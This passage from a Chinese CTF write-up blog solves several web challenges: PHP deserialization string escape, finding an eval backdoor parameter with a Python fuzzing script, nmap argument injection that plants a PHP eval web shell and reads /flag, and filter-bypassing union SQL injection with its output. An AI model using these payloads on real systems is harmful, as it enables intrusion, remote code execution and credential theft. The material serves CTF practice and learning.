invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="设置-function-‘phpinfo’，看到auto-append-file项为d0g3-f1ag-php-这里为搜索源代码中的过滤词f1ag找到-，可能为flag所在，同时源代码中还要file-get-contents函数，只要能控制参数为d0g3-f1ag-php即可得到flag"><a href="#设置-function-‘phpinfo’，看到auto-append-file项为d0g3-f1ag-php-这里为搜索源代码中的过滤词f1ag找到-，可能为flag所在，同时源代码中还要file-get-contents函数，只要能控制参数为d0g3-f1ag-php即可得到flag" class="headerlink" title="设置$function &#x3D;&#x3D; ‘phpinfo’，看到auto_append_file项为d0g3_f1ag.php(这里为搜索源代码中的过滤词f1ag找到)，可能为flag所在，同时源代码中还要file_get_contents函数，只要能控制参数为d0g3_f1ag.php即可得到flag"></a>设置$function &#x3D;&#x3D; ‘phpinfo’，看到auto_append_file项为d0g3_f1ag.php(这里为搜索源代码中的过滤词f1ag找到)，可能为flag所在，同时源代码中还要file_get_contents函数，只要能控制参数为d0g3_f1ag.php即可得到flag</h3><h3 id="通过extract函数我们可以覆盖-SESSION数组中的元素，但是因为-SESSION-img-的值设置在我们覆盖后，所以我们直接覆盖是没有意义的，但是又因为filter函数对序列化后的对象的替换操作满足反序列化字符串逃逸的条件，所以我们可以通过反序列化字符串逃逸来间接控制-SESSION-img"><a href="#通过extract函数我们可以覆盖-SESSION数组中的元素，但是因为-SESSION-img-的值设置在我们覆盖后，所以我们直接覆盖是没有意义的，但是又因为filter函数对序列化后的对象的替换操作满足反序列化字符串逃逸的条件，所以我们可以通过反序列化字符串逃逸来间接控制-SESSION-img" class="headerlink" title="通过extract函数我们可以覆盖_SESSION数组中的元素，但是因为_SESSION[img]的值设置在我们覆盖后，所以我们直接覆盖是没有意义的，但是又因为filter函数对序列化后的对象的替换操作满足反序列化字符串逃逸的条件，所以我们可以通过反序列化字符串逃逸来间接控制_SESSION[img]"></a>通过extract函数我们可以覆盖_SESSION数组中的元素，但是因为<code>_SESSION[img]</code>的值设置在我们覆盖后，所以我们直接覆盖是没有意义的，但是又因为filter函数对序列化后的对象的替换操作满足反序列化字符串逃逸的条件，所以我们可以通过反序列化字符串逃逸来间接控制<code>_SESSION[img]</code></h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107135706">反序列化</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $a=&quot;d0g3_f1ag.php&quot;;</span></span><br><span class="line"><span class="comment">// print_r(base64_encode($a));</span></span><br><span class="line"><span class="comment">// $a=&quot;/d0g3_fllllllag&quot;;</span></span><br><span class="line"><span class="comment">// print_r(base64_encode($a));</span></span><br><span class="line"><span class="variable">$function</span>=<span class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:8:&quot;function&quot;;s:1:&quot;a&quot;&#125;;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;phpflagflagflagflagflag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="comment">// print_r(serialize($_SESSION));</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="comment">//a:3:&#123;s:4:&quot;user&quot;;s:23:&quot;&quot;;s:8:&quot;function&quot;;s:64:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:8:&quot;function&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br><span class="line"><span class="comment">//a:3:&#123;s:4:&quot;user&quot;;s:23:&quot;&quot;;s:8:&quot;function&quot;;s:64:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:8:&quot;function&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="这里通过在user中添加被替换的字符串来控制一部分序列化后的字符串中的有关function的变为user的值"><a href="#这里通过在user中添加被替换的字符串来控制一部分序列化后的字符串中的有关function的变为user的值" class="headerlink" title="这里通过在user中添加被替换的字符串来控制一部分序列化后的字符串中的有关function的变为user的值"></a>这里通过在user中添加被替换的字符串来控制一部分序列化后的字符串中的有关function的变为user的值</h3><blockquote>
<p>a:3:{s:4:”user”;s:23:”<code>&quot;;s:8:&quot;function&quot;;s:64:&quot;</code>“;s:3:”img”;s:20:”<code>ZDBnM19mbGxsbGxsYWc=</code>“;s:8:”function”;s:1:”<code>a</code>“;}<del>“;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;”;}</del></p>
</blockquote>
<h3 id="这样我们就成功将img的值改为了我们想要包含的文件的base64，接下来按-SESSION-键名-值post传入参数即可"><a href="#这样我们就成功将img的值改为了我们想要包含的文件的base64，接下来按-SESSION-键名-值post传入参数即可" class="headerlink" title="这样我们就成功将img的值改为了我们想要包含的文件的base64，接下来按_SESSION[键名]=值post传入参数即可"></a>这样我们就成功将img的值改为了我们想要包含的文件的base64，接下来按<code>_SESSION[键名]=值</code>post传入参数即可</h3><blockquote>
<p><code>_SESSION[user] = phpflagflagflagflagflag&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:8:&quot;function&quot;;s:1:&quot;a&quot;;&#125;</code></p>
</blockquote>
<h3 id="得到-flag-flag-in-d0g3-fllllllag"><a href="#得到-flag-flag-in-d0g3-fllllllag" class="headerlink" title="得到$flag = &#39;flag in /d0g3_fllllllag&#39;;"></a>得到<code>$flag = &#39;flag in /d0g3_fllllllag&#39;;</code></h3><h3 id="然后换个要包含的参数即可"><a href="#然后换个要包含的参数即可" class="headerlink" title="然后换个要包含的参数即可"></a>然后换个要包含的参数即可</h3><blockquote>
<p><code>_SESSION[user] = phpflagflagflagflagflag&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:8:&quot;function&quot;;s:1:&quot;a&quot;;&#125;</code></p>
</blockquote>
<h3 id="得到flag-3"><a href="#得到flag-3" class="headerlink" title="得到flag"></a>得到flag</h3><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><h3 id="访问后直接下载备份文件，得到超级多php文件和一个index-html"><a href="#访问后直接下载备份文件，得到超级多php文件和一个index-html" class="headerlink" title="访问后直接下载备份文件，得到超级多php文件和一个index.html"></a>访问后直接下载备份文件，得到超级多php文件和一个index.html</h3><h3 id="看了几个后发现基本上都是get和post很多很抽象的参数，如果eval，但是大部分都会在eval之前设置成新的值，也就是不能利用，所以我们要用脚本去测试哪一个能用"><a href="#看了几个后发现基本上都是get和post很多很抽象的参数，如果eval，但是大部分都会在eval之前设置成新的值，也就是不能利用，所以我们要用脚本去测试哪一个能用" class="headerlink" title="看了几个后发现基本上都是get和post很多很抽象的参数，如果eval，但是大部分都会在eval之前设置成新的值，也就是不能利用，所以我们要用脚本去测试哪一个能用"></a>看了几个后发现基本上都是get和post很多很抽象的参数，如果eval，但是大部分都会在eval之前设置成新的值，也就是不能利用，所以我们要用脚本去测试哪一个能用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">files=os.listdir(<span class="string">&#x27;D:/phpStudy/PHPTutorial/WWW/src/&#x27;</span>)</span><br><span class="line">reg1=re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=_GET\[\&#x27;).*(?=\&#x27;\])&#x27;</span>)</span><br><span class="line">reg2=re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=_POST\[\&#x27;).*(?=\&#x27;\])&#x27;</span>)</span><br><span class="line"><span class="comment"># for i in files:                             #一次性测试一个php文件的全部get请求</span></span><br><span class="line"><span class="comment">#     url=&quot;http://localhost/src/&quot;+i</span></span><br><span class="line"><span class="comment">#     f=open(&quot;D:/phpStudy/PHPTutorial/WWW/src/&quot;+i)</span></span><br><span class="line"><span class="comment">#     data=f.read()</span></span><br><span class="line"><span class="comment">#     f.close()</span></span><br><span class="line"><span class="comment">#     result=reg1.findall(data)</span></span><br><span class="line"><span class="comment">#     payload=url+&quot;?&quot;</span></span><br><span class="line"><span class="comment">#     for j in result:</span></span><br><span class="line"><span class="comment">#         payload=payload+j+&quot;=echo xianxin;&amp;&quot;</span></span><br><span class="line"><span class="comment">#     print(payload)</span></span><br><span class="line"><span class="comment">#     html=requests.get(payload)</span></span><br><span class="line"><span class="comment">#     if &quot;xianxin&quot; in html.text:</span></span><br><span class="line"><span class="comment">#         print(payload)</span></span><br><span class="line"><span class="comment">#         exit(1)</span></span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;D:/phpStudy/PHPTutorial/WWW/src/xk0SzyKwfzw.php&quot;</span>)         <span class="comment">#分别测试每个get请求</span></span><br><span class="line">data=f.read()</span><br><span class="line">f.close()</span><br><span class="line">result=reg1.findall(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    payload=<span class="string">&quot;http://localhost/src/xk0SzyKwfzw.php?&quot;</span>+i+<span class="string">&quot;=echo xianxin;&quot;</span></span><br><span class="line">    html=requests.get(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xianxin&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in files:                      #一次性测试一个php文件的全部POST请求</span></span><br><span class="line"><span class="comment">#     datas=&#123;&#125;</span></span><br><span class="line"><span class="comment">#     url=&quot;http://localhost/src/&quot;+i</span></span><br><span class="line"><span class="comment">#     f=open(&quot;D:/phpStudy/PHPTutorial/WWW/src/&quot;+i)</span></span><br><span class="line"><span class="comment">#     data=f.read()</span></span><br><span class="line"><span class="comment">#     f.close()</span></span><br><span class="line"><span class="comment">#     result=reg2.findall(data)</span></span><br><span class="line"><span class="comment">#     for j in result:</span></span><br><span class="line"><span class="comment">#         datas[j]=&quot;echo xianxin;&quot;</span></span><br><span class="line"><span class="comment">#     req=requests.post(url,data = data)   </span></span><br><span class="line"><span class="comment">#     print(url) </span></span><br><span class="line"><span class="comment">#     if &quot;xianxin&quot; in req.text:</span></span><br><span class="line"><span class="comment">#         print(url)</span></span><br><span class="line"><span class="comment">#         exit(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># f=open(&quot;D:/phpStudy/PHPTutorial/WWW/src/xk0SzyKwfzw.php&quot;)        #分别测试每个POST请求</span></span><br><span class="line"><span class="comment"># data=f.read()</span></span><br><span class="line"><span class="comment"># f.close()</span></span><br><span class="line"><span class="comment"># result2=reg2.findall(data)</span></span><br><span class="line"><span class="comment"># for k in result2:</span></span><br><span class="line"><span class="comment">#     req = requests.post(url,data=&#123;k:&quot;echo xxxxxx;&quot;&#125;)</span></span><br><span class="line"><span class="comment">#     if &quot;xianxin&quot; in html.text:</span></span><br><span class="line"><span class="comment">#         print(payload)</span></span><br><span class="line"><span class="comment">#         exit(1)</span></span><br></pre></td></tr></table></figure>
<h3 id="因为一个一个参数测试太慢，所以选择先判断是哪个php文件，再判断是哪个参数"><a href="#因为一个一个参数测试太慢，所以选择先判断是哪个php文件，再判断是哪个参数" class="headerlink" title="因为一个一个参数测试太慢，所以选择先判断是哪个php文件，再判断是哪个参数"></a>因为一个一个参数测试太慢，所以选择先判断是哪个php文件，再判断是哪个参数</h3><p><img src="https://pics.lwzheng.tech/2025/02/16/67b1876fc0ec3.png" alt="30d63332c5ab325251297ecb3263727b.png"><br><img src="https://pics.lwzheng.tech/2025/02/16/67b18779260b2.png" alt="bf4e1d351a400831caf868962184a374.png"></p>
<h3 id="找到参数后去环境里面RCE即可得到flag"><a href="#找到参数后去环境里面RCE即可得到flag" class="headerlink" title="找到参数后去环境里面RCE即可得到flag"></a>找到参数后去环境里面RCE即可得到flag</h3><blockquote>
<p>xk0SzyKwfzw.php?Efa5BVG&#x3D;cat &#x2F;flag</p>
</blockquote>
<h1 id="BUUCTF-2018-Online-Tool-网鼎杯-2020-朱雀组-Nmap"><a href="#BUUCTF-2018-Online-Tool-网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[BUUCTF 2018]Online Tool      [网鼎杯 2020 朱雀组]Nmap"></a>[BUUCTF 2018]Online Tool      [网鼎杯 2020 朱雀组]Nmap</h1><h1 id="nmap命令"><a href="#nmap命令" class="headerlink" title="nmap命令"></a>nmap命令</h1><blockquote>
<p>关于nmap保存文件和读取文件的方式,有几种主流方式<br>-oG:grep保存<br>-oN:正常保存<br>-oX:xml格式保存<br>-oA:将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中<br>-iL:从inputfilename文件中读取扫描的目标。在这个文件中要有一个主机或者网络的列表，由空格键、制表键或者回车键作为分割符。如果使用-iL-，nmap就会从标准输入stdin读取主机名字。你可以从指定目标一节得到更加详细的信息<br>-oN:把扫描结果重定向到一个可读的文件logfilename中。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">escapeshellarg()+escapeshellcmd() 之殇</a></p>
<blockquote>
<p>第一题<code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code><br><img src="https://pics.lwzheng.tech/2025/02/16/67b1af6a165c1.png" alt="7d28d6e7-19f2-42a2-a488-7dcec75f177f.png"></p>
</blockquote>
<h3 id="第二题因为有对php的waf所以要用"><a href="#第二题因为有对php的waf所以要用" class="headerlink" title="第二题因为有对php的waf所以要用"></a>第二题因为有对php的waf所以要用</h3><blockquote>
<p><code>127.0.0.1 | &#39; &lt;?=@eval($_POST[&quot;cmd&quot;]);?&gt; -oG shell.phtml &#39;</code></p>
</blockquote>
<h3 id="也可以用预期解读取文件的方法，源代码里面给了flag在-flag，所以利用-iL参数读取flag"><a href="#也可以用预期解读取文件的方法，源代码里面给了flag在-flag，所以利用-iL参数读取flag" class="headerlink" title="也可以用预期解读取文件的方法，源代码里面给了flag在&#x2F;flag，所以利用-iL参数读取flag"></a>也可以用预期解读取文件的方法，源代码里面给了flag在&#x2F;flag，所以利用-iL参数读取flag</h3><blockquote>
<p><code>127.0.0.1’ -iL /flag -oN vege.txt ’</code></p>
</blockquote>
<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><h3 id="注册时发现admin已经存在，后登录，看到广告会打印在页面上，以为是xss，没想到是sql注入"><a href="#注册时发现admin已经存在，后登录，看到广告会打印在页面上，以为是xss，没想到是sql注入" class="headerlink" title="注册时发现admin已经存在，后登录，看到广告会打印在页面上，以为是xss，没想到是sql注入"></a>注册时发现admin已经存在，后登录，看到广告会打印在页面上，以为是xss，没想到是sql注入</h3><h3 id="注入点在广告名，这个在我尝试模版注入时发现-被替换，既然存在过滤，那必然存在漏洞，尝试sql注入后发现要进到广告详情里面才能触发，原理为在回显到页面时进行了转义处理，但在进到广告详情时会再次从数据库中获得初始信息"><a href="#注入点在广告名，这个在我尝试模版注入时发现-被替换，既然存在过滤，那必然存在漏洞，尝试sql注入后发现要进到广告详情里面才能触发，原理为在回显到页面时进行了转义处理，但在进到广告详情时会再次从数据库中获得初始信息" class="headerlink" title="注入点在广告名，这个在我尝试模版注入时发现+被替换，既然存在过滤，那必然存在漏洞，尝试sql注入后发现要进到广告详情里面才能触发，原理为在回显到页面时进行了转义处理，但在进到广告详情时会再次从数据库中获得初始信息"></a>注入点在广告名，这个在我尝试模版注入时发现+被替换，既然存在过滤，那必然存在漏洞，尝试sql注入后发现要进到广告详情里面才能触发，原理为在回显到页面时进行了转义处理，但在进到广告详情时会再次从数据库中获得初始信息</h3><h3 id="然后就是注入了，过滤还是不少的，有空格，-，-，or-and，-等，空格用-，但是or还是挺致命的，既破坏了我们的order，也破坏了我们的information，然后就是破坏掉了我们的注释符，选择用’闭合后面的’，将sql语句变为select-from-ads-where-title-title-注入命令-limit-0-1"><a href="#然后就是注入了，过滤还是不少的，有空格，-，-，or-and，-等，空格用-，但是or还是挺致命的，既破坏了我们的order，也破坏了我们的information，然后就是破坏掉了我们的注释符，选择用’闭合后面的’，将sql语句变为select-from-ads-where-title-title-注入命令-limit-0-1" class="headerlink" title="然后就是注入了，过滤还是不少的，有空格，-，+，or,and，#等，空格用&#x2F;**&#x2F;，但是or还是挺致命的，既破坏了我们的order，也破坏了我们的information，然后就是破坏掉了我们的注释符，选择用’闭合后面的’，将sql语句变为select * from ads where title = &#39;$title&#39;注入命令,&#39;&#39; limit 0,1;"></a>然后就是注入了，过滤还是不少的，有空格，-，+，or,and，#等，空格用&#x2F;**&#x2F;，但是or还是挺致命的，既破坏了我们的order，也破坏了我们的information，然后就是破坏掉了我们的注释符，选择用’闭合后面的’，将sql语句变为<code>select * from ads where title = &#39;$title&#39;注入命令,&#39;&#39; limit 0,1;</code></h3><h3 id="不过还是先看看列数吧，order-by用group-by代替，当然直接union-select-1-2-3，···也可以"><a href="#不过还是先看看列数吧，order-by用group-by代替，当然直接union-select-1-2-3，···也可以" class="headerlink" title="不过还是先看看列数吧，order by用group by代替，当然直接union select 1,2,3，···也可以"></a>不过还是先看看列数吧，order by用group by代替，当然直接union select 1,2,3，···也可以</h3><blockquote>
<p>1’group&#x2F;<strong>&#x2F;by&#x2F;</strong>&#x2F;22,’1<br>1’group&#x2F;<strong>&#x2F;by&#x2F;</strong>&#x2F;23,’1<br>Unknown column ‘23’ in ‘group statement’</p>
</blockquote>
<h3 id="无敌了无敌了，22个列也是无敌了"><a href="#无敌了无敌了，22个列也是无敌了" class="headerlink" title="无敌了无敌了，22个列也是无敌了"></a>无敌了<del>无敌了</del>，22个列也是无敌了</h3><blockquote>
<p>1’union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,18,19,20,21,22,’1</p>
</blockquote>
<h3 id="回显位为2-3"><a href="#回显位为2-3" class="headerlink" title="回显位为2,3"></a>回显位为2,3</h3><blockquote>
<p>1’union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,18,19,20,21,22,’1<br>web1</p>
</blockquote>
<h3 id="数据库名为web1"><a href="#数据库名为web1" class="headerlink" title="数据库名为web1"></a>数据库名为web1</h3><h3 id="然后就是怎么替代information-schema，我们要找到另外一个也能保存所有数据的表，这里使用mysql-innodb-table-stats"><a href="#然后就是怎么替代information-schema，我们要找到另外一个也能保存所有数据的表，这里使用mysql-innodb-table-stats" class="headerlink" title="然后就是怎么替代information_schema，我们要找到另外一个也能保存所有数据的表，这里使用mysql.innodb_table_stats"></a>然后就是怎么替代information_schema，我们要找到另外一个也能保存所有数据的表，这里使用mysql.innodb_table_stats</h3><blockquote>
<p>1’union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,(select&#x2F;<strong>&#x2F;group_concat(table_name)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;mysql.innodb_table_stats&#x2F;</strong>&#x2F;where&#x2F;**&#x2F;database_name&#x3D;’web1’),3,4,5,6,7,8,9,10,11,12,13,14,15,16,118,19,20,21,22,’1<br>ads,users</p>
</blockquote>
<h3 id="获得表名，但是还是没有列名，这里要无列名注入"><a href="#获得表名，但是还是没有列名，这里要无列名注入" class="headerlink" title="获得表名，但是还是没有列名，这里要无列名注入"></a>获得表名，但是还是没有列名，这里要无列名注入</h3><blockquote>
<p>1’union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,(select&#x2F;<strong>&#x2F;group_concat(b)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;(select&#x2F;</strong>&#x2F;1,2&#x2F;<strong>&#x2F;as&#x2F;</strong>&#x2F;b,3&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;*&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,18,19,20,21,22,’1<br>2,flag,admin,xianxin</p>
</blockquote>
<h3 id="上面这句话的原理为-select-1-2-as-b-3-union-select-from-users-a创建了一个包含users所有数据且列名更换为1-2-3的a表，然后再用as引用或者在前面用反引号引用来表示列名即可获得数据"><a href="#上面这句话的原理为-select-1-2-as-b-3-union-select-from-users-a创建了一个包含users所有数据且列名更换为1-2-3的a表，然后再用as引用或者在前面用反引号引用来表示列名即可获得数据" class="headerlink" title="上面这句话的原理为(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a创建了一个包含users所有数据且列名更换为1,2,3的a表，然后再用as引用或者在前面用反引号引用来表示列名即可获得数据"></a>上面这句话的原理为<code>(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a</code>创建了一个包含users所有数据且列名更换为1,2,3的a表，然后再用as引用或者在前面用反引号引用来表示列名即可获得数据</h3><blockquote>
<p>1’union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,(select&#x2F;<strong>&#x2F;group_concat(b)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;(select&#x2F;</strong>&#x2F;1,2,3&#x2F;<strong>&#x2F;as&#x2F;</strong>&#x2F;b&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;*&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,18,19,20,21,22,’1<br>3,<code>flag&#123;5f355c8b-850a-454f-9879-4e8d733a22bc&#125;</code>,53e217ad4c721eb9565cf25a5ec3b66e,202cb962ac59075b964b07152d234b70</p>
</blockquote>
<h3 id="第一次猜错列了，第二次就拿到flag了"><a href="#第一次猜错列了，第二次就拿到flag了" class="headerlink" title="第一次猜错列了，第二次就拿到flag了"></a>第一次猜错列了，第二次就拿到flag了</h3><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><h3 id="进去之后提示了sql盲注，先找找注入点，登录界面的两个参数尝试后发现回显一直都是一样的，用sleep也没用，一开始还以为是和之前一个题一样暗ban了sleep要用randombolb函数代替，但是看见还有几个按钮没按，先按一下看看"><a href="#进去之后提示了sql盲注，先找找注入点，登录界面的两个参数尝试后发现回显一直都是一样的，用sleep也没用，一开始还以为是和之前一个题一样暗ban了sleep要用randombolb函数代替，但是看见还有几个按钮没按，先按一下看看" class="headerlink" title="进去之后提示了sql盲注，先找找注入点，登录界面的两个参数尝试后发现回显一直都是一样的，用sleep也没用，一开始还以为是和之前一个题一样暗ban了sleep要用randombolb函数代替，但是看见还有几个按钮没按，先按一下看看"></a>进去之后提示了sql盲注，先找找注入点，登录界面的两个参数尝试后发现回显一直都是一样的，用sleep也没用，一开始还以为是和之前一个题一样暗ban了sleep要用randombolb函数代替，但是看见还有几个按钮没按，先按一下看看</h3><h3 id="按完后进入url为-search-php-id-1-2-3-4-5-这五个页面，很明显，都没有flag，但是之前做过一个sql布尔盲注题，也是存在1和2这种两个以上不同回显的页面，可以利用if语句分别跳转到两个页面判断ascii值，所以猜测id存在注入"><a href="#按完后进入url为-search-php-id-1-2-3-4-5-这五个页面，很明显，都没有flag，但是之前做过一个sql布尔盲注题，也是存在1和2这种两个以上不同回显的页面，可以利用if语句分别跳转到两个页面判断ascii值，所以猜测id存在注入" class="headerlink" title="按完后进入url为&#x2F;search.php?id&#x3D;1,2,3,4,5 这五个页面，很明显，都没有flag，但是之前做过一个sql布尔盲注题，也是存在1和2这种两个以上不同回显的页面，可以利用if语句分别跳转到两个页面判断ascii值，所以猜测id存在注入"></a>按完后进入url为&#x2F;search.php?id&#x3D;1,2,3,4,5 这五个页面，很明显，都没有flag，但是之前做过一个sql布尔盲注题，也是存在1和2这种两个以上不同回显的页面，可以利用if语句分别跳转到两个页面判断ascii值，所以猜测id存在注入</h3><h3 id="先试一下-id-1’，回显变为error！（这里回显的error！代表sql语句报错，后面回显的error！！！代表id未查询到，猜测应该是这样），然后试一下常规注入，发现有waf，回显为可别让我逮住了，先fuzz测试一下"><a href="#先试一下-id-1’，回显变为error！（这里回显的error！代表sql语句报错，后面回显的error！！！代表id未查询到，猜测应该是这样），然后试一下常规注入，发现有waf，回显为可别让我逮住了，先fuzz测试一下" class="headerlink" 